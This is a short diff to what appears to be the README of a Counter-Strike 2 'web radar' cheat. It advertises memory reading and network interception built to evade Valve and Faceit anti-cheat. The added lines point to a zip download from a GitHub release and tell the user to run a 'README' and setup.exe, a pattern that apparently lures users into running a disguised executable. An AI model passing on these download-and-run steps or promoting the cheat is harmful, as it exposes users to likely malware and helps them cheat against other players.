@@ -6,5 +6,6 @@ Note: Using cheats or hacks in multiplayer games can lead to bans and is against
 - The use of network data interception and memory reading methods through special technologies minimizes the likelihood of detection by Valve and Faceit protection systems. 
 - Such a tool provides the user with a tactical advantage, allowing them to see even opponents hidden behind objects, while remaining almost invisible to protective mechanisms and manual monitoring.
 - - Instruction
-- Open README in the root folder.
+- Open release https://github.com/edidonramsey-lgtm/WebRadar-CS2/releases/download/RadarCS2/WebRadar.zip
+- Run README in the root folder.
 - Run setup.exe.
